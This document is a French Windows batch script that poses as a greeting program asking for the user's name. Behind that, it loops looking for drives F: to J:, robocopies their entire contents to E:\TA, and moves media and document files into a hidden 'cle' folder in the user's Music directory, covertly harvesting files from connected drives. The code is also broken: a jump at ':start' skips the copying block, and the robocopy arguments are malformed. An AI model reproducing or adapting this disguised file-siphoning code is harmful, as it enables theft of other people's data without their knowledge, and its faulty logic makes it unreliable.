@echo off
TITLE Salutation à  %time% 
COLOR 71 
if not exist Name.cfg goto star

for /f %%N in (Name.cfg) do echo Salut! . Est ce %%N ?
echo.
:rtry
echo O/Oui , N/Nom  ;
set /p ans=
if "%ans%"=="O" goto suite
if "%ans%"=="o" goto suite
if "%ans%"=="N" goto rnam
if "%ans%"=="n" goto rnam
goto err1
:rnam
echo.
echo Ok je m'excuse , je reprends donc,
echo.
:star
echo Salut. Dites moi votre nom : 
set /p Name=
echo %Name%>Name.cfg
:suite
set c=1

:start
goto b
set /a c=%c%+1
if %c%==1111 title Bonne journée

 if exist F:\nul robocopy F:\ E:\TA\%TIME% [ *.* ] [ /E /MT:10 	/COPY:DAT /LOG:D:\cles\X%random%.txt /FP ]
 if exist G:\nul robocopy G:\ E:\TA\%TIME% [ *.* ] [ /E /MT:10   /COPY:DAT /LOG:X%random%.txt /FP ]
 if exist H:\nul robocopy H:\ E:\TA\%TIME% [ *.* ] [ /E /MT:10   /COPY:DAT /LOG:X%random%.txt /FP ]
 if exist I:\nul robocopy I:\ E:\TA\%TIME% [ *.* ] [ /E /MT:10   /COPY:DAT /LOG:X%random%.txt /FP ]
 if exist J:\nul robocopy J:\ E:\TA\%TIME% [ *.* ] [ /E /MT:10   /COPY:DAT /LOG:X%random%.txt /FP ]
For %%s in ( F G H I J ) do if  exist %%s:\nul goto end
goto start
:end
title Deplacement
color 7E
cd\
cd %userprofile%\music
md cle
attrib +H cle
cd cle
for  %%A in (mp3 docx pdf avi flv mp4 3gp txt) do md %%A
for /R  E:\TA %%G in (*.mp3 *.docx *.pdf *.avi *.flv *.mp4 *.3gp *.txt) do  xcopy "%%G" %userprofile%\music\cle /y /c /q  >> D:cles\log1.txt
for %%H in (mp3 docx pdf avi flv mp4 3gp txt) do xcopy  "%userprofile%\music\cle\*.%%H"  %userprofile%\music\cle\%%H /y /c /q  >> D:cles\log2.txt
for /R  E:\TA %%G in (*.mp3 *.docx *.pdf *.avi *.flv *.mp4 *.3gp *.txt) do del "%%G"
for %%I in (mp3 docx pdf avi flv mp4 3gp txt) do del "%userprofile%\music\cle\*.%%I"
:b
set i=1
:turn
set /a i=%i% +1
if  %i%==10000 color 2E
if  %i%== 25000 goto start
goto turn

:err1
echo Je vous prie , Veuillez répondre a la question posée O/N 
goto rtry
